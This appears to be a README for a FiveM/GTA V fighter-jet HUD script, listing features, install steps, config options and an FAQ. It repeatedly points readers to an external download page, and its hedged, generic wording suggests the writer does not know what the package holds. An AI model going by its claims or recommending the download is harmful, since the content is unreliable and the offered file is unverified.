# Solived Fighter Jet HUD v2 - Game Script Utility 2026

> A fighter jet inspired HUD for FiveM and GTA V aircraft, created to swap out the default display for cockpit readouts, target cues, and live flight telemetry.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/samstone2001/solived-jet-hud-v2-script?style=flat-square)](https://github.com/samstone2001/solived-jet-hud-v2-script)

---

<p align="center">
  <a href="https://samstone2001.github.io/solived-jet-hud-v2-script/">
    <img src="https://img.shields.io/badge/Download-Solived%20Fighter%20Jet%20HUD%20Script-brightgreen?style=for-the-badge" alt="Download Solived Fighter Jet HUD Script">
  </a>
</p>

> **[Direct Download - Solived Fighter Jet HUD](https://samstone2001.github.io/solived-jet-hud-v2-script/)**

---

[Download Latest Build](https://samstone2001.github.io/solived-jet-hud-v2-script/)

---

## What It Does

Solived Fighter Jet HUD v2 is a self-contained FiveM resource made for GTA V aircraft gameplay. Its purpose is to present a fighter-jet style interface with clear cockpit-like data, giving pilots a more focused view of flight and combat details while airborne.

Rather than acting as a broad UI overhaul, the script is centered on practical in-seat feedback. It combines telemetry, targeting indicators, and warning-style notifications for aircraft use, and pairs them with vehicle-specific presentation plus synthesized cockpit audio for a more specialized HUD setup.

---

## Core Capabilities

- Fighter jet HUD designed for aircraft-focused sessions in FiveM and GTA V
- Live flight telemetry for cockpit-style information while flying
- Weapon reticles and annunciator components for in-flight combat feedback
- Lock state and target distance readouts
- RWR-style warning alerts for improved situational awareness
- Synthesized cockpit audio cues
- Vehicle-specific themes for different aircraft presentation styles
- Standalone resource layout for simple installation

---

## Installation

1. Download the latest build using the link above.
2. Place the resource folder in your FiveM resources directory.
3. Ensure the folder name matches the packaged resource, such as `solived-fighter-jet-hud-script-v2`.
4. Add the resource to your server configuration and start it like any other FiveM resource.

Example server entry:

`ensure solived-fighter-jet-hud-script-v2`

If the package includes optional HTML or UI assets, keep the full folder structure intact so the HUD can load its cockpit interface correctly.

---

## Configuration

Typical script settings may be exposed through the resource files or configuration assets.

| Option | Purpose |
| --- | --- |
| HUD theme | Selects the visual style for a specific aircraft or cockpit layout |
| Telemetry display | Controls which flight values are shown on screen |
| Targeting cues | Enables or disables lock and distance indicators |
| Warning alerts | Toggles RWR-style alert behavior |
| Cockpit audio | Turns synthesized audio cues on or off |
| Resource start mode | Lets the HUD load automatically with the server |

If your build includes editable config values, update them before starting the resource to avoid runtime reload steps.

---

## Compatibility Notes

- Designed for FiveM
- Intended for GTA V aircraft and fighter jet gameplay
- Best suited to vehicles that benefit from cockpit-style HUD information
- Some UI elements may vary depending on the aircraft model or server setup
- If another HUD resource is already controlling aircraft overlays, you may need to adjust load order or disable conflicting display modules

---

## FAQ

### How do I install it?
Download the build, copy the resource into your FiveM resources folder, and add an `ensure` line to your server config.

### Can I customize the look?
Yes, the resource is built around themed cockpit presentation, so visual and audio elements may be adjustable depending on the included files.

### Does it work outside aircraft?
It is intended for fighter jet and aircraft use, so behavior outside that context may be limited or not relevant.

### What should I do after updating?
Replace the old resource files with the newer build, then restart the resource or server so the updated HUD assets load.

### Where are the settings stored?
Any editable settings are usually kept in the resource files alongside the script and UI assets.

### Is it compatible with every FiveM server?
Not always. Compatibility can depend on your server framework, aircraft setup, and any other HUD resources already running.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
